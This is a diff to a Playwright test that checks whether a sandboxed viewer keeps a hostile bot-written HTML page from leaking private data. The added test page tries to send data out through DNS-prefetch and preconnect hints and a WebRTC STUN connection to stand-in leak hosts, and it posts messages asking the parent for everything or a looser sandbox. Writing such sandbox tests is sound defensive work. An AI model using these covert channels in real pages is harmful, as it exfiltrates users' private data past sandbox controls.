@@ -2,7 +2,7 @@ import { expect, test } from "@playwright/test";
 
 // A bot-written HTML page runs in the sandbox and receives private data. This runs the real viewer shell in a
 // real browser, with a hostile page, and checks that the data arrives and that nothing leaves.
-const PAGE = `<!doctype html><meta name="praci-sources" content="Cash">
+const PAGE = `<!doctype html><meta name="praci-sources" content="Cash"><link rel="dns-prefetch" href="//leak.example.test"><link rel="preconnect" href="https://leak.example.test">
 <body><pre id="out">waiting</pre><pre id="log"></pre><script>
 const log = (line) => { document.getElementById("log").textContent += line + "\\n"; };
 let count = 0;
@@ -42,6 +42,16 @@ const attempt = async (name, fn) => {
   await attempt("open", () => String(window.open("https://example.com/open")));
   await attempt("top", () => { top.location = "https://example.com/top"; });
   await attempt("parent", () => { parent.location = "https://example.com/parent"; });
+  await attempt("dns-prefetch", () => {
+    const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//dyn.example.test"; document.head.append(l);
+  });
+  await attempt("webrtc", async () => {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.leak.example.test:3478" }] });
+    pc.createDataChannel("x");
+    await pc.setLocalDescription(await pc.createOffer());
+    await new Promise((resolve) => setTimeout(resolve, 1500));
+    pc.close();
+  });
   // Messages to the app and to the shell: neither may do anything.
   parent.postMessage({ type: "praci-request", what: "everything" }, "*");
   parent.postMessage({ srcdoc: "<p>x</p>", sandbox: "allow-same-origin allow-scripts", csp: "" }, "*");
@@ -84,6 +94,12 @@ test("an HTML page gets its data and cannot send anything out", async ({ page, c
     expect(log, name).toMatch(new RegExp(`${name}:blocked`));
   }
   expect(log).toContain("open:null");
+  // DNS prefetch is switched off before anything of the page's own, in the document the viewer built.
+  expect(
+    await frame.evaluate(() => document.head.firstElementChild?.getAttribute("http-equiv")),
+  ).toBe("x-dns-prefetch-control");
+  // Whatever the page tried with link hints or WebRTC produced no HTTP request.
+  expect(outside.filter((url) => url.includes("example.test"))).toEqual([]);
   expect(log).toContain("csp:connect-src");
   // The beacon and the form were attempted; the network and navigation checks below show they went nowhere.
   expect(outside).toEqual([]);
